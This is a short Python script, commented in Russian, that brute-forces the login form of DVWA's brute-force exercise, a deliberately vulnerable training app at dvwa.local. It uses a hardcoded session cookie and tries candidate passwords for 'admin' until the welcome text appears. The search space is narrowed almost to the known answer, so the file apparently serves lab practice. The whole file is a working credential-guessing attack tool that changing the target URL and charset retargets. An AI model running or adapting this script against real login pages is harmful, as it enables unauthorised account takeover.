import itertools
import requests
import time

# Настройки
URL = "http://dvwa.local/vulnerabilities/brute/"
USERNAME = "admin"
CHARSET = 'abcdefghijklmnopqrstuvwxyz'
PASSWORD_LENGTH = 8
PREFIX = "passwor"
SESSION = requests.Session()

# Устанавливаем cookie для авторизации
SESSION.cookies.set("PHPSESSID", "pbdr9qnvepmkpua72o8gs9t7k4fco27m")
SESSION.cookies.set("security", "low")


def generate_passwords(prefix, length, charset):
    remaining_length = length - len(prefix)
    return (
        prefix + ''.join(comb)
        for comb in itertools.product(charset, repeat=remaining_length)
    )


def is_password_correct(url, username, password):
    params = {'username': username, 'password': password, 'Login': 'Login'}
    try:
        response = SESSION.get(url, params=params)
        if password == 'password':
            print(response.text)
        return "Welcome to the password protected area" in response.text
    except requests.exceptions.RequestException as e:
        print(f"[-] Ошибка при запросе: {e}")
        return False


def main():
    start_time = time.time()
    print("[*] Начинаем подбор пароля...")

    for password in generate_passwords(PREFIX, PASSWORD_LENGTH, CHARSET):
        print(f"[*] Пробуем пароль: {password}")
        if is_password_correct(URL, USERNAME, password):
            print(f"[+] Пароль найден: {password}")
            break
    else:
        print("[-] Пароль не найден.")

    end_time = time.time()
    print(f"[+] Время выполнения: {end_time - start_time:.2f} секунд")


if __name__ == "__main__":
    main()
